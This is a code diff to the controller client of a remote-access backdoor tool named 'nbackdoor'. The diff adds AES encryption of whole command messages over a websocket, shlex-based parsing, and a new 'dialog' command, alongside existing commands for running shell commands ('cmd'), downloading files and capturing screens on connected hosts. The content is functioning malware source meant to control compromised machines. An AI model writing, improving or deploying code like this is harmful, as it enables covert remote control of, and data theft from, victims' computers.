@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-import argparse
+import shlex
 import os
 import ctypes
 import subprocess
@@ -10,6 +10,7 @@ import uuid
 import json
 import time
 from base64 import b64decode, b64encode
+import sys
 from websocket import create_connection
 from Crypto.Cipher import AES
 __author__ = 'nekocode'
@@ -27,7 +28,7 @@ class ControllerClient:
         self.exit = False
 
     def run(self):
-        while not client.exit:
+        while not self.exit:
             try:
                 os.system('cls')
                 print 'finding server...'
@@ -35,13 +36,14 @@ class ControllerClient:
                 os.system('cls')
 
                 pwd = raw_input('Enter the password:')
-                sercret_msg = {'id': self.ID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET), 'pwd': self.encrypt(pwd)}
+                sercret_msg = {'id': self.ID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
+                               'pwd': self.encrypt(pwd)}
                 self.ws.send(json.dumps(sercret_msg))
 
-                msg = json.loads(self.ws.recv())
+                msg = json.loads(self.decrypt(self.ws.recv()))
                 if 'data' not in msg:
                     continue
-                data = self.decrypt(msg['data'])
+                data = msg['data']
                 os.system('cls')
                 if data == 'login failed':
                     print 'Login failed.'
@@ -52,11 +54,12 @@ class ControllerClient:
                 while not self.exit:
                     input_str = raw_input('nbackdoor:')
                     msg = self.command_to_msg(input_str)
+
                     if msg:
-                        self.ws.send(msg)
-                        msg = json.loads(self.ws.recv())
+                        self.ws.send(self.encrypt(msg))
+                        msg = json.loads(self.decrypt(self.ws.recv()))
                         if 'data' in msg:
-                            data = self.decrypt(msg['data'])
+                            data = msg['data']
                             print data
 
                 self.ws.close()
@@ -67,36 +70,49 @@ class ControllerClient:
                 time.sleep(3)
 
     def command_to_msg(self, input_str):
-        input_array = input_str.split()
+        input_array = shlex.split(input_str)
         command_str = input_array[0]
+        arguments_str = input_array[1:]
         # args_str = input_array[1:]
 
         command = None
 
         if command_str == 'help':
-            parser = argparse.ArgumentParser(description="nbackdoor by nekocode!!!",
-                                             version='0.1.0',
-                                             formatter_class=argparse.RawTextHelpFormatter,
-                                             epilog='neko!')
-            parser.print_help()
+            pass
+
         elif command_str == 'list':
             command = 'list'
+
         elif command_str == 'cmd':
             command = 'cmd'
+
         elif command_str == 'download':
             command = 'download'
+
         elif command_str == 'dialog':
-            command = 'dialog'
+            if len(arguments_str) >= 2:
+                target = arguments_str[0]
+                if target.isdigit():
+                    # todo: add from
+                    return json.dumps({'cmd': 'dialog', 'to': target})
+                else:
+                    print 'Traget argument must be int.\n'
+            else:
+                print 'Too few arguments.\n'
+            return None
+
         elif command_str == 'screen':
             command = 'screen'
+
         elif command_str == 'exit':
             self.exit = True
             return None
+
         else:
             print 'Not available command.\n'
             return None
 
-        return json.dumps({'cmd': self.encrypt(command)})
+        return json.dumps({'cmd': command})
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
